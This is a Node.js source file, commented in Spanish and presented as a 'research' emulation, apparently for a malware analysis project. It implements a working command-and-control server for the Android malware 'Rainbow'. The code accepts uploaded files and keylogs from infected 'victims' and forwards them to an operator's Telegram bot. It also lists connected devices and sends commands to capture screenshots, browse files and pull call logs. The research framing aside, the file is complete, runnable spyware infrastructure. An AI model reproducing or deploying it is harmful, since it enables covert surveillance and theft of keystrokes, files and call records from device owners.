const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

/**
 * SERVIDOR C2 DE INVESTIGACIÓN - PROYECTO RAINBOW
 * Basado en el análisis de n.smali, i.smali y d.smali.
 * Este servidor emula el protocolo exacto del malware analizado.
 */

// --- CONFIGURACIÓN ---
let config;
try {
    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("❌ ERROR: Configura el archivo data.json con el token del bot y tu ID.");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true, // Compatibilidad con el motor de n.smali
    pingInterval: 10000,
    pingTimeout: 5000
});

const bot = new TelegramBot(config.token, { polling: true });
const victims = new Map(); // Mapa de IDs de dispositivos conectados
const userState = new Map(); // Estado de navegación en Telegram

app.use(express.json());

// --- RECEPCIÓN DE ARCHIVOS Y LOGS (Visto en RainbowAccessibilityService) ---

const upload = multer({ storage: multer.memoryStorage() });
app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'] || "ID_Desconocido";
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>📥 Archivo Recibido</b>\nDispositivo: <code>${devId}</code>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.status(200).send('ok');
});

app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'] || "ID_Desconocido";
    const log = req.body.text || JSON.stringify(req.body);
    if (log && log.length > 0) {
        bot.sendMessage(config.id, `<b>⌨️ Keylog [${devId}]:</b>\n<code>${log}</code>`, { parse_mode: 'HTML' });
    }
    res.status(200).send('ok');
});

// --- LÓGICA DE SOCKETS (Basada en n.smali e i.smali) ---

io.on('connection', (socket) => {
    const headers = socket.handshake.headers;
    // El APK usa 'currenttarget' como ID principal según b.smali
    const deviceId = headers['currenttarget'] || headers['model'] || socket.id;
    const model = headers['model'] || "Android";

    victims.set(deviceId, socket.id);
    console.log(`[+] Conexión establecida: ${model} (${deviceId})`);

    bot.sendMessage(config.id, `<b>📱 Dispositivo Online</b>\nModelo: ${model}\nID: <code>${deviceId}</code>`, { parse_mode: 'HTML' });

    // Manejo de 'ping' para resetear el timer de reconexión de n.smali
    socket.on('ping', () => socket.emit('pong'));

    // Manejo de respuestas en el canal 'data' (confirmado en i.smali)
    socket.on('data', (payload) => {
        const raw = typeof payload === 'object' ? JSON.stringify(payload, null, 2) : payload;
        bot.sendMessage(config.id, `<b>📨 Respuesta de ${deviceId}:</b>\n<pre>${raw}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', () => {
        victims.delete(deviceId);
        bot.sendMessage(config.id, `<b>❌ Dispositivo Offline</b>\nID: ${deviceId}`);
    });
});

// --- INTERFAZ DE TELEGRAM ---

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(config.id)) return;

    const text = msg.text;

    if (text === '/start' || text === '↩️ Volver') {
        userState.delete(chatId);
        return bot.sendMessage(chatId, `<b>✯ Panel Rainbow C2 ✯</b>\nActivos: ${victims.size}`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['📱 Lista de Víctimas']],
                resize_keyboard: true
            }
        });
    }

    if (text === '📱 Lista de Víctimas') {
        const ids = Array.from(victims.keys());
        if (ids.length === 0) return bot.sendMessage(chatId, "No hay dispositivos conectados.");
        const kb = ids.map(id => [id]);
        kb.push(['↩️ Volver']);
        return bot.sendMessage(chatId, "Selecciona una ID para controlar:", { reply_markup: { keyboard: kb, resize_keyboard: true } });
    }

    // Selección de dispositivo
    if (victims.has(text)) {
        userState.set(chatId, { target: text });
        const actions = [['📸 Capturar Pantalla', '📂 Ver Archivos'], ['📞 Obtener Llamadas', '↩️ Volver']];
        return bot.sendMessage(chatId, `📍 Controlando: ${text}`, { reply_markup: { keyboard: actions, resize_keyboard: true } });
    }

    // Procesamiento de acciones
    const state = userState.get(chatId);
    if (state && state.target) {
        let cmd = null;
        switch(text) {
            case '📸 Capturar Pantalla': cmd = 'screenshot'; break;
            case '📂 Ver Archivos': cmd = 'file-explorer'; break;
            case '📞 Obtener Llamadas': cmd = 'calls'; break;
        }

        if (cmd) {
            const socketId = victims.get(state.target);
            if (socketId) {
                // ESTRUCTURA DE SEGURIDAD: Enviamos el comando en varios formatos
                // por si la ofuscación de d.smali espera una clave distinta.
                const payload = {
                    action: cmd,
                    type: cmd,
                    order: cmd,
                    request: cmd
                };
                io.to(socketId).emit('data', payload);
                bot.sendMessage(chatId, `⚡ Comando <b>${cmd}</b> enviado.`, { parse_mode: 'HTML' });
            }
        }
    }
});

server.listen(3000, () => {
    console.log("---------------------------------------");
    console.log("🚀 SERVIDOR C2 RAINBOW INICIADO");
    console.log("Puerto: 3000 | Esperando dispositivos...");
    console.log("---------------------------------------");
});
